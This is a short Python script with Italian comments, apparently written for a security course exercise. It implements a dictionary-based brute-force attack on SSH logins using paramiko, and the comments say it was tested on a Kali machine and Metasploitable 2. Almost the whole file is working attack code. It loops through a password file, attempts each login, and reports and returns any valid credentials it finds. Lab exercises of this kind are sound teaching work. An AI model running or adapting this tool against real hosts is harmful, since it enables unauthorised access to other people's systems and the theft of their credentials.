# Si richiede allo studente di scrivere un programma,
#  con un linguaggio a sua scelta tra Python e C (preferisco python),
# che permetta lʼesecuzione di un attacco Brute-Force ad un servizio SSH su
#  una macchina Debian/Ubuntu (kali va benissimo come macchina di test). 


import paramiko

def ssh_brute_force(host, port, username, password_file):
    # Creazione del client SSH
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Apertura del file di dizionario delle password
    with open(password_file, 'r') as f:
        passwords = f.readlines()
    
    for password in passwords:
        password = password.strip() # Rimuove spazi e newline inutili

        try:
            
            print(f"Tentativo: {username}:{password}")
            # Prova a connettersi con username e password attuali
            client.connect(host, port=port, username=username, password=password)
            # Se va a buon fine:
            print(f"Successo! Credenziali valide trovate: {username}:{password}")
            # Ritorna subito la coppia credenziali trovata
            return username, password
        
        # Eccezzione se l'autentificazione fallisce : password sbagliata
        except paramiko.AuthenticationException:
            print("Authentificazione fallita.")
        except paramiko.SSHException as sshException:
            print(f"Errore SSH: {sshException}")
            break

        except Exception as e:
            print(f"Errore {e}")
            break

        # Assicura che la connessione venga chiusa sempre
        finally:
            client.close()
    
    # Se escono i cicli senza successo, nessuna password ha funzionato
    print("Attacco Brute-force fallito. Nessuna credenziale valida trovata.")
    return None

if __name__ == "__main__":

    # Parametri di connessione (modificabili per il test)
    host = "127.0.0.1"
    port = 22
    username = "kali"
    password_file = "passwords.txt"
    ssh_brute_force(host, port, username, password_file)

# Testato anche con metasploitable 2 (username: msfadmin, e il file password apposito)